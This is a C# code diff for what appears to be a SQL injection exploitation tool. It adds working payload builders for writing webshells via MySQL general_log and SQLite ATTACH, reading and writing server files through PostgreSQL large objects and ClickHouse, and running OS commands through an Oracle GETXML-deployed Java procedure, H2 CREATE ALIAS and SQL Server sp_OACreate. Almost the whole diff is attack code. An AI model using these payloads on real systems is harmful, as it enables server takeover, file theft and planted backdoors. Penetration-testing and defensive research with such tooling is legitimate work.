@@ -73,6 +73,30 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                     case "CSVWRITE写文件":
                         await WriteFileByH2(config, vm).ConfigureAwait(false);
                         break;
+                    case "日志写WebShell":
+                        await WriteFileByMySqlLog(config, vm).ConfigureAwait(false);
+                        break;
+                    case "大对象读文件":
+                        await ReadFileByPgLargeObject(config, vm).ConfigureAwait(false);
+                        break;
+                    case "大对象写文件":
+                        await WriteFileByPgLargeObject(config, vm).ConfigureAwait(false);
+                        break;
+                    case "ATTACH写WebShell":
+                        await WriteFileBySqlite(config, vm).ConfigureAwait(false);
+                        break;
+                    case "file()读文件":
+                        await ReadFileByClickHouse(config, vm).ConfigureAwait(false);
+                        break;
+                    case "INTO OUTFILE写文件":
+                        await WriteFileByClickHouse(config, vm).ConfigureAwait(false);
+                        break;
+                    case "Java读文件":
+                        await ReadFileByOracleJava(config, vm).ConfigureAwait(false);
+                        break;
+                    case "Java写文件":
+                        await WriteFileByOracleJava(config, vm).ConfigureAwait(false);
+                        break;
                 }
             }
             catch (OperationCanceledException)
@@ -371,9 +395,26 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             {
                 return;
             }
+            if (config.DataConfig.SelectedDBType.Equals(DBType.Oracle)
+                || config.DataConfig.SelectedDBType.Equals(DBType.DM))
+            {
+                await ExecuteCmdOracle(config, vm).ConfigureAwait(false);
+                return;
+            }
+            if (config.DataConfig.SelectedDBType.Equals(DBType.H2))
+            {
+                await ExecuteCmdH2(config, vm).ConfigureAwait(false);
+                return;
+            }
             if (config.DataConfig.SelectedDBType.Equals(DBType.PostgreSQL))
             {
                 await ExecuteCmdPostgreSQL(config, vm).ConfigureAwait(false);
+                return;
+            }
+            if (config.DataConfig.SelectedDBType.Equals(DBType.Kingbase))
+            {
+                //KingbaseES兼容PG语法：仅COPY FROM PROGRAM（UDF二进制为PG专用，不接）
+                await ExecuteCmdPostgreSqlCopy(config, vm).ConfigureAwait(false);
                 return;
             }
             if (config.DataConfig.SelectedDBType.Equals(DBType.MySQL))
@@ -843,6 +884,12 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         /// </summary>
         private static async Task ExecuteCmdSQLServer(AppConfig config, FileCmdViewModel vm)
         {
+            //sp_OACreate(wscript.shell)：xp_cmdshell被删除时的备用通道（需sysadmin+堆叠，输出经BULK INSERT回读）
+            if (!string.IsNullOrEmpty(vm.SelectedCmdMethod) && vm.SelectedCmdMethod.Contains("sp_OACreate", StringComparison.Ordinal))
+            {
+                await ExecuteCmdSqlServerOle(config, vm).ConfigureAwait(false);
+                return;
+            }
             try
             {
                 string cmdHex = TextCodec.StrToHex(vm.CmdText, "GB2312");
@@ -1021,6 +1068,519 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             string payload = " 1=1;call csvwrite(" + Enc(vm.FilePath) + "," + Enc(innerSelect) + ",null," + Enc("writeColumnHeader=false") + ");--";
             await SendPayload(config, payload).ConfigureAwait(false);
             Log.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
+        }
+
+        //==================== MySQL general_log 写WebShell（堆叠注入）====================
+
+        /// <summary>
+        /// MySQL general_log写WebShell：general_log记录原始SQL文本，shell代码以字符串字面量形式进日志文件。
+        /// 需堆叠注入+secure_file_priv为空+mysql账号对目标目录可写；日志文件含Query前缀等多余文本（PHP可容忍）。
+        /// 内容不能同时包含单双引号（引号会破坏包裹它的字符串字面量）。
+        /// </summary>
+        private static async Task WriteFileByMySqlLog(AppConfig config, FileCmdViewModel vm)
+        {
+            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
+            {
+                Log.Warning("日志写WebShell需要堆叠注入（set global general_log 系列语句）！");
+                return;
+            }
+            string pathEsc = vm.FilePath.Replace("\\", "/", StringComparison.Ordinal).Replace("'", "''", StringComparison.Ordinal);
+            string content = vm.FileContent;
+            string quoted;
+            if (!content.Contains('\''))
+            {
+                quoted = "'" + content + "'";
+            }
+            else if (!content.Contains('"'))
+            {
+                //默认sql_mode下双引号可作字符串（ANSI_QUOTES开启时失效，需人工改用Union写文件）
+                quoted = "\"" + content + "\"";
+            }
+            else
+            {
+                Log.Warning("文件内容同时包含单双引号，无法通过日志写文件（general_log记录原始SQL文本，引号会破坏语句）！请改用Union写文件或去掉一种引号。");
+                return;
+            }
+            string payload = " 1=1;set global general_log=on;set global general_log_file='" + pathEsc + "';select " + quoted + ";set global general_log=off;-- ";
+            await SendPayload(config, payload).ConfigureAwait(false);
+            Log.Show("日志写WebShell已执行！请人工检查目标文件（需secure_file_priv为空、mysql账号对目标目录可写）。");
+        }
+
+        //==================== PostgreSQL 大对象读写（lo_import/lo_export，单语句表达式，Union/报错通道可用）====================
+
+        /// <summary>大对象读写通道检查（lo_import/lo_export为副作用表达式，盲注多次求值会失败，仅Union/报错可用）</summary>
+        private static bool EnsurePgLoChannel(AppConfig config)
+        {
+            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Union) || config.DataConfig.SelectedInjectType.Equals(InjectType.Error))
+            {
+                return true;
+            }
+            Log.Warning("大对象读写只支持Union/报错注入通道（lo_import/lo_export为副作用表达式，盲注多次求值会失败）！盲注请改用Copy方式（堆叠）。");
+            return false;
+        }
+
+        /// <summary>PostgreSQL 大对象读文件（lo_import→读pg_largeobject→lo_unlink清理，需superuser或pg_read_server_files）</summary>
+        private static async Task ReadFileByPgLargeObject(AppConfig config, FileCmdViewModel vm)
+        {
+            if (!EnsurePgLoChannel(config))
+            {
+                return;
+            }
+            int oid = 90200 + new Random().Next(0, 7000);
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            try
+            {
+                await FetchScalar(config, "(select lo_import('" + pathEsc + "'," + oid + "))").ConfigureAwait(false);
+                string hex = await FetchScalar(config, "(select coalesce(string_agg(encode(data,'hex'),'' order by pageno),'') from pg_largeobject where loid=" + oid + ")").ConfigureAwait(false);
+                string result = TextCodec.unHex(hex ?? "", vm.FileEncoding);
+                vm.SetFileContent(result);
+                Log.Show("读文件完成，内容长度：" + result.Length + "字节！（需superuser或pg_read_server_files，失败时内容为空）");
+            }
+            finally
+            {
+                try
+                {
+                    await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
+                }
+                catch (Exception)
+                {
+                }
+            }
+        }
+
+        /// <summary>PostgreSQL 大对象写文件（lo_from_bytea→lo_export→lo_unlink清理，需superuser或pg_write_server_files）</summary>
+        private static async Task WriteFileByPgLargeObject(AppConfig config, FileCmdViewModel vm)
+        {
+            if (!EnsurePgLoChannel(config))
+            {
+                return;
+            }
+            int oid = 90200 + new Random().Next(0, 7000);
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FileContent));
+            Log.Show("大对象写文件（" + hex.Length / 2 + "字节，loid=" + oid + "）……注意：GET方式可能因URL长度受限！");
+            await FetchScalar(config, "(select lo_from_bytea(" + oid + ",decode('" + hex + "','hex')))").ConfigureAwait(false);
+            await FetchScalar(config, "(select lo_export(" + oid + ",'" + pathEsc + "'))").ConfigureAwait(false);
+            try
+            {
+                await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
+            }
+            catch (Exception)
+            {
+            }
+            Log.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功（需superuser或pg_write_server_files）！");
+        }
+
+        //==================== SQLite ATTACH 写WebShell（堆叠注入）====================
+
+        /// <summary>SQLite ATTACH写WebShell：附加目标文件为新库，建表插入blob内容（x'hex'），需堆叠注入</summary>
+        private static async Task WriteFileBySqlite(AppConfig config, FileCmdViewModel vm)
+        {
+            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
+            {
+                Log.Warning("ATTACH写WebShell需要堆叠注入（attach database/create table/insert 三条语句）！");
+                return;
+            }
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FileContent));
+            string payload = " 1=1;attach database '" + pathEsc + "' as sqli_exp;create table sqli_exp.exp(dataz text);insert into sqli_exp.exp(dataz) values (x'" + hex + "');-- ";
+            await SendPayload(config, payload).ConfigureAwait(false);
+            Log.Show("ATTACH写WebShell已执行！请人工检查写文件是否成功（目标路径需可写；文件头部会带SQLite库格式头，PHP/JSP可容忍时方可作shell）。");
+        }
+
+        //==================== ClickHouse file()/INTO OUTFILE 文件读写 ====================
+
+        /// <summary>ClickHouse file()表函数表达式（LineAsString格式整行落单列s，仅能读user_files目录内文件）</summary>
+        private static string ClickHouseFileExpr(string path)
+        {
+            return "file('" + path.Replace("'", "''", StringComparison.Ordinal) + "','LineAsString','s String')";
+        }
+
+        /// <summary>ClickHouse file()读文件（仅user_files目录；Union/报错/盲注逐行取回）</summary>
+        private static async Task ReadFileByClickHouse(AppConfig config, FileCmdViewModel vm)
+        {
+            string fe = ClickHouseFileExpr(vm.FilePath);
+            string countExpr = "(select count(1) from " + fe + ")";
+            string LineExpr(int i) => "(select s from " + fe + " limit 1 offset " + i + ")";
+            try
+            {
+                StringBuilder result = new StringBuilder();
+                switch (config.DataConfig.SelectedInjectType)
+                {
+                    case InjectType.Blind:
+                    case InjectType.Time:
+                    case InjectType.Stacked:
+                    case InjectType.Dns:
+                        if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
+                        {
+                            Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
+                            return;
+                        }
+                        int count = await DataComm.GetBoolValue(config, countExpr, 0, 100000).ConfigureAwait(false);
+                        Log.SysLog("读到文件内容，共有" + count + "行数据！");
+                        for (int i = 0; i < count; i++)
+                        {
+                            config.CheckStop();
+                            result.AppendLine(await DataComm.GetStringByBool(config, LineExpr(i), 100000).ConfigureAwait(false));
+                            vm.SetFileContent(result.ToString());
+                        }
+                        break;
+                    case InjectType.Union:
+                    case InjectType.Error:
+                        bool useError = config.DataConfig.SelectedInjectType == InjectType.Error;
+                        string countStr = useError
+                            ? await DataComm.DataDumpWithError(config, countExpr).ConfigureAwait(false)
+                            : await DataComm.DataDumpWithNoFrom(config, countExpr).ConfigureAwait(false);
+                        int.TryParse(countStr, out int ucount);
+                        Log.SysLog("读到文件内容，共有" + ucount + "行数据！");
+                        for (int i = 0; i < ucount; i++)
+                        {
+                            config.CheckStop();
+                            string row = useError
+                                ? await DataComm.DataDumpWithError(config, LineExpr(i)).ConfigureAwait(false)
+                                : await DataComm.DataDumpWithNoFrom(config, LineExpr(i)).ConfigureAwait(false);
+                            result.AppendLine(row);
+                            vm.SetFileContent(result.ToString());
+                        }
+                        break;
+                }
+                Log.Show("读文件完成，内容长度：" + result.Length + "字节！（file()仅能读user_files目录内文件）");
+            }
+            catch (OperationCanceledException)
+            {
+                Log.Show("已停止文件操作！");
+            }
+            catch (Exception e)
+            {
+                Log.Show("读文件发生异常：" + e.Message);
+            }
+        }
+
+        /// <summary>ClickHouse INTO OUTFILE写文件（Union注入单语句，RawBLOB格式裸字节落盘，需非readonly模式）</summary>
+        private static async Task WriteFileByClickHouse(AppConfig config, FileCmdViewModel vm)
+        {
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FileContent));
+            StringBuilder sb = new StringBuilder(" 1=0 union all select ");
+            int cols = config.DataConfig.SumColumnCount;
+            int showIdx = config.DataConfig.ShowColumnIndex;
+            if (cols > 0 && showIdx >= 1 && showIdx <= cols)
+            {
+                //1=0压制原始行；非显示位用空字符串填充（RawBLOB下空串不产生字节；类型不匹配时需人工调整payload）
+                for (int i = 1; i <= cols; i++)
+                {
+                    sb.Append(i == showIdx ? "unhex('" + hex + "')" : "''");
+                    sb.Append(',');
+                }
+                sb.Remove(sb.Length - 1, 1);
+            }
+            else
+            {
+                sb.Append("unhex('" + hex + "')");
+            }
+            sb.Append(" into outfile '").Append(pathEsc).Append("' format RawBLOB-- ");
+            await SendPayload(config, sb.ToString()).ConfigureAwait(false);
+            Log.Show("INTO OUTFILE写文件已执行！请人工检查（路径相对ClickHouse服务进程工作目录，readonly=1时不可用）。");
+        }
+
+        //==================== Oracle/DM GETXML Java 通道（命令执行+文件读写，免堆叠）====================
+        //原理：dbms_xmlquery.getxml 的参数经 EXECUTE IMMEDIATE 执行，可传匿名PL/SQL块（自治事务）执行DDL，
+        //整个PL/SQL整体hex编码后经 utl_raw.cast_to_varchar2(hextoraw(...)) 还原，彻底规避引号转义。
+        //借此在纯SELECT注入（Union/盲注均可）下：CREATE JAVA SOURCE → 创建Java映射函数 → 执行命令/读写文件。
+        //前提：账号有 CREATE PROCEDURE 权限且 DBMS_JAVA 可用（一般DBA/高权限账号）；返回值限 varchar2(4000)。
+
+        /// <summary>Oracle Java通道已部署目标标识（避免每次命令重复部署）</summary>
+        private static string? _oraJavaReadyKey = null;
+
+        /// <summary>GETXML执行外壳：把任意PL/SQL/DDL（整体hex编码）在SELECT表达式内执行</summary>
+        private static string OraGetXmlExec(string plsql)
+        {
+            string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(plsql));
+            return "(select to_char(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''" + hex + "'')); end;')) from dual)";
+        }
+
+        /// <summary>SqliUtil Java源码：runCmd执行命令 / readFile读文件 / writeFile写文件（内容为hex）</summary>
+        private const string OraJavaSource =
+            "import java.io.*;\n" +
+            "public class SqliUtil {\n" +
+            "    public static String runCmd(String cmd) {\n" +
+            "        String out = \"\";\n" +
+            "        try {\n" +
+            "            Process p = Runtime.getRuntime().exec(cmd);\n" +
+            "            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n" +
+            "            String line;\n" +
+            "            while ((line = r.readLine()) != null) { out += line + \"\\n\"; }\n" +
+            "            r.close();\n" +
+            "        } catch (Exception e) { out = \"ERR:\" + e.getMessage(); }\n" +
+            "        return out;\n" +
+            "    }\n" +
+            "    public static String readFile(String path) {\n" +
+            "        String out = \"\";\n" +
+            "        try {\n" +
+            "            BufferedReader r = new BufferedReader(new FileReader(path));\n" +
+            "            String line;\n" +
+            "            while ((line = r.readLine()) != null) { out += line + \"\\n\"; }\n" +
+            "            r.close();\n" +
+            "        } catch (Exception e) { out = \"ERR:\" + e.getMessage(); }\n" +
+            "        return out;\n" +
+            "    }\n" +
+            "    public static String writeFile(String path, String hex) {\n" +
+            "        try {\n" +
+            "            FileOutputStream f = new FileOutputStream(path);\n" +
+            "            for (int i = 0; i + 1 < hex.length(); i += 2) { f.write(Integer.parseInt(hex.substring(i, i + 2), 16)); }\n" +
+            "            f.close();\n" +
+            "            return \"OK\";\n" +
+            "        } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
+            "    }\n" +
+            "}";
+
+        /// <summary>部署Oracle Java通道：CREATE JAVA SOURCE（hex分块拼接规避字面量4000上限）+ 三个映射函数 + 自检探活</summary>
+        private static async Task ProvisionOracleJava(AppConfig config)
+        {
+            Log.Show("正在通过 GETXML 通道部署 Java 存储过程（SqliUtil）……");
+            string srcHex = Convert.ToHexString(Encoding.UTF8.GetBytes(OraJavaSource));
+            StringBuilder sb = new StringBuilder("create or replace and compile java source named \"SqliUtil\" as ");
+            for (int off = 0; off < srcHex.Length; off += 3800)
+            {
+                if (off > 0)
+                {
+                    sb.Append("||");
+                }
+                sb.Append("utl_raw.cast_to_varchar2(hextoraw('").Append(srcHex, off, Math.Min(3800, srcHex.Length - off)).Append("')");
+            }
+            //所有DDL均为 or replace 幂等：盲注通道多次求值也安全
+            await FetchScalar(config, OraGetXmlExec(sb.ToString())).ConfigureAwait(false);
+            await FetchScalar(config, OraGetXmlExec("create or replace function SqliEval(p in varchar2) return varchar2 as language java name 'SqliUtil.runCmd(java.lang.String) return java.lang.String'")).ConfigureAwait(false);
+            await FetchScalar(config, OraGetXmlExec("create or replace function SqliRead(p in varchar2) return varchar2 as language java name 'SqliUtil.readFile(java.lang.String) return java.lang.String'")).ConfigureAwait(false);
+            await FetchScalar(config, OraGetXmlExec("create or replace function SqliWrite(p in varchar2,c in varchar2) return varchar2 as language java name 'SqliUtil.writeFile(java.lang.String,java.lang.String) return java.lang.String'")).ConfigureAwait(false);
+            try
+            {
+                string probe = await FetchScalar(config, "(select SqliEval('echo sqli_ora_ok') from dual)").ConfigureAwait(false);
+                if ((probe ?? "").Contains("sqli_ora_ok", StringComparison.Ordinal))
+                {
+                    Log.Success("Oracle Java通道自检通过（SqliEval已可用）！");
+                }
+                else
+                {
+                    Log.Warning("Java通道自检未通过（SqliEval无预期回显）！可能原因：账号无CREATE PROCEDURE权限/DBMS_JAVA不可用/dbms_xmlquery被移除。回显：" + probe);
+                }
+            }
+            catch (Exception e)
+            {
+                Log.Warning("Java通道自检异常：" + e.Message);
+            }
+        }
+
+        /// <summary>确保Oracle Java通道就绪（同目标只部署一次）</summary>
+        private static async Task EnsureOracleJavaReady(AppConfig config)
+        {
+            string targetKey = config.RequestTxt ?? "";
+            if (string.Equals(_oraJavaReadyKey, targetKey, StringComparison.Ordinal))
+            {
+                return;
+            }
+            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Blind) || config.DataConfig.SelectedInjectType.Equals(InjectType.Time))
+            {
+                Log.Show("提示：盲注通道部署Java过程较慢（取值需多次求值），建议优先Union通道……");
+            }
+            await ProvisionOracleJava(config).ConfigureAwait(false);
+            _oraJavaReadyKey = targetKey;
+        }
+
+        /// <summary>Oracle/DM Java命令执行（GETXML通道，首次自动部署SqliUtil）</summary>
+        private static async Task ExecuteCmdOracle(AppConfig config, FileCmdViewModel vm)
+        {
+            try
+            {
+                await EnsureOracleJavaReady(config).ConfigureAwait(false);
+                string cmdHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.CmdText));
+                Log.SysLog("命令已执行：" + vm.CmdText);
+                string result = await FetchScalar(config, "(select SqliEval(utl_raw.cast_to_varchar2(hextoraw('" + cmdHex + "'))) from dual)").ConfigureAwait(false);
+                vm.SetCmdResult(result);
+                Log.Show("命令执行完成，获取到结果长度：" + (result ?? "").Length + "字节！（varchar2上限4000字符；管道/重定向请自行加 cmd /c 或 /bin/sh -c）");
+            }
+            catch (OperationCanceledException)
+            {
+                Log.Show("已停止命令执行！");
+            }
+            catch (Exception e)
+            {
+                Log.Show("命令执行发生异常：" + e.ToString());
+            }
+        }
+
+        /// <summary>Oracle/DM Java读文件（SqliRead按文本逐行读取，varchar2上限4000字符）</summary>
+        private static async Task ReadFileByOracleJava(AppConfig config, FileCmdViewModel vm)
+        {
+            try
+            {
+                await EnsureOracleJavaReady(config).ConfigureAwait(false);
+                string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
+                string result = await FetchScalar(config, "(select SqliRead(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))) from dual)").ConfigureAwait(false);
+                vm.SetFileContent(result ?? "");
+                Log.Show("读文件完成，内容长度：" + (result ?? "").Length + "字节！（varchar2上限4000字符，二进制文件请用其他通道）");
+            }
+            catch (OperationCanceledException)
+            {
+                Log.Show("已停止文件操作！");
+            }
+            catch (Exception e)
+            {
+                Log.Show("读文件发生异常：" + e.Message);
+            }
+        }
+
+        /// <summary>Oracle/DM Java写文件（SqliWrite内容按hex解码落盘，hex后受varchar2(4000)限制约2000字节）</summary>
+        private static async Task WriteFileByOracleJava(AppConfig config, FileCmdViewModel vm)
+        {
+            try
+            {
+                await EnsureOracleJavaReady(config).ConfigureAwait(false);
+                string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
+                string contentHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FileContent));
+                if (contentHex.Length > 4000)
+                {
+                    Log.Warning("文件内容hex后超过4000字符（约2000字节），超出varchar2传参上限，请精简内容或分多次写入！");
+                    return;
+                }
+                string result = await FetchScalar(config, "(select SqliWrite(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "')),utl_raw.cast_to_varchar2(hextoraw('" + contentHex + "'))) from dual)").ConfigureAwait(false);
+                if ((result ?? "").StartsWith("OK", StringComparison.Ordinal))
+                {
+                    Log.Success("写文件完成！目标：" + vm.FilePath);
+                }
+                else
+                {
+                    Log.Warning("写文件回执异常：" + result + "（请检查路径权限与Java通道自检日志）");
+                }
+            }
+            catch (OperationCanceledException)
+            {
+                Log.Show("已停止文件操作！");
+            }
+            catch (Exception e)
+            {
+                Log.Show("写文件发生异常：" + e.Message);
+            }
+        }
+
+        //==================== H2 CREATE ALIAS 命令执行（需H2 1.x+JDK编译器，堆叠注入）====================
+
+        /// <summary>H2 SQX别名函数是否已创建（本次会话内复用）</summary>
+        private static bool _h2AliasReady = false;
+
+        /// <summary>H2 CREATE ALIAS命令执行：堆叠建Java函数别名SQX（$$美元引用规避引号），取值走当前通道</summary>
+        private static async Task ExecuteCmdH2(AppConfig config, FileCmdViewModel vm)
+        {
+            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
+            {
+                Log.Warning("H2 CREATE ALIAS命令执行需要堆叠注入（创建Java函数别名）！");
+                return;
+            }
+            try
+            {
+                if (!_h2AliasReady)
+                {
+                    //Java源码内 useDelimiter("\\A") 读全量输出；$$美元引用包裹规避引号转义
+                    string javaSrc = "String sqx(String cmd) throws Exception { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; }";
+                    await SendPayload(config, " 1=1;drop alias if exists SQX;create alias SQX as $$" + javaSrc + "$$;-- ").ConfigureAwait(false);
+                    _h2AliasReady = true;
+                    Log.Show("H2 CREATE ALIAS函数SQX已创建（需H2 1.x且JDK编译器可用；H2 2.x已移除内联编译，此方式不可用）！");
+                }
+                //命令char链编码规避引号；别名函数可直接在表达式中引用
+                string chain = TextCodec.StrToChrOrChar(vm.CmdText, "char", "||", "UTF-8");
+                Log.SysLog("命令已执行：" + vm.CmdText);
+                string result = await FetchScalar(config, "SQX(" + chain + ")").ConfigureAwait(false);
+                vm.SetCmdResult(result ?? "");
+                Log.Show("命令执行完成，获取到结果长度：" + (result ?? "").Length + "字节！");
+            }
+            catch (OperationCanceledException)
+            {
+                Log.Show("已停止命令执行！");
+            }
+            catch (Exception e)
+            {
+                Log.Show("命令执行发生异常：" + e.ToString());
+            }
+        }
+
+        //==================== SQLServer sp_OACreate 命令执行（xp_cmdshell被删除时的备用通道，需sysadmin+堆叠）====================
+
+        /// <summary>SQLServer sp_OACreate(wscript.shell)执行命令：输出重定向到临时文件，再经BULK INSERT通道回读</summary>
+        private static async Task ExecuteCmdSqlServerOle(AppConfig config, FileCmdViewModel vm)
+        {
+            try
+            {
+                string outFile = "C:/Windows/Temp/ssqlo" + MyTools.RandStr(4).ToLower() + ".txt";
+                string StripStackedPrefix(string p) => config.DataConfig.IsTimeChannel ? p.Replace(" 1=1;", ";", StringComparison.Ordinal) : p;
+                string OleRun(string cmdline) => StripStackedPrefix(" 1=1;declare @s int;exec [master]..[sp_oacreate] 'wscript.shell',@s out;exec [master]..[sp_oamethod] @s,'run',null,'" + cmdline.Replace("'", "''", StringComparison.Ordinal) + "',0,true;exec [master]..[sp_oadestroy] @s;-- ");
+                await SendPayload(config, StripStackedPrefix(" 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;-- ")).ConfigureAwait(false);
+                string winOut = outFile.Replace('/', '\\');
+                await SendPayload(config, OleRun("cmd /c " + vm.CmdText + " > \"" + winOut + "\" 2>&1")).ConfigureAwait(false);
+                Log.SysLog("命令已执行（sp_OACreate wscript.shell）：" + vm.CmdText);
+                if (!vm.CmdShowResult)
+                {
+                    Log.Show("命令执行完成（未开启回显）！");
+                    return;
+                }
+                string result = await ReadSqlServerFileText(config, outFile).ConfigureAwait(false);
+                vm.SetCmdResult(result);
+                Log.Show("命令执行完成，获取到结果长度：" + (result ?? "").Length + "字节！");
+                try
+                {
+                    await SendPayload(config, OleRun("cmd /c del /f /q \"" + winOut + "\"")).ConfigureAwait(false);
+                }
+                catch (Exception)
+                {
+                }
+            }
+            catch (OperationCanceledException)
+            {
+                Log.Show("已停止命令执行！");
+            }
+            catch (Exception e)
+            {
+                Log.Show("命令执行发生异常：" + e.ToString());
+            }
+        }
+
+        /// <summary>SQLServer BULK INSERT读文件并返回文本（sp_OACreate命令输出回读共用）</summary>
+        private static async Task<string> ReadSqlServerFileText(AppConfig config, string path)
+        {
+            string dropTable = PayloadFactory.BasePayload.Get("CmdDropTable");
+            string readPayload = PayloadFactory.BasePayload.Get("FileReadBulk").Replace("{path}", path, StringComparison.Ordinal);
+            if (config.DataConfig.IsTimeChannel)
+            {
+                dropTable = dropTable.Replace(" 1=1;", ";", StringComparison.Ordinal);
+                readPayload = readPayload.Replace(" 1=1;", ";", StringComparison.Ordinal);
+            }
+            await SendPayload(config, readPayload).ConfigureAwait(false);
+            try
+            {
+                switch (config.DataConfig.SelectedInjectType)
+                {
+                    case InjectType.Union:
+                        return await DataComm.DataDumpWithNoFrom(config, PayloadFactory.BasePayload.Get("FileContent")).ConfigureAwait(false);
+                    case InjectType.Error:
+                        return await DataComm.DataDumpWithError(config, PayloadFactory.BasePayload.Get("FileContent")).ConfigureAwait(false);
+                    default:
+                        if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
+                        {
+                            Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
+                            return "";
+                        }
+                        return (await DataComm.GetStringByBool(config, PayloadFactory.BasePayload.Get("FileContent"), 1024 * 100).ConfigureAwait(false)) ?? "";
+                }
+            }
+            finally
+            {
+                try
+                {
+                    await SendPayload(config, dropTable).ConfigureAwait(false);
+                }
+                catch (Exception)
+                {
+                }
+            }
         }
     }
 }
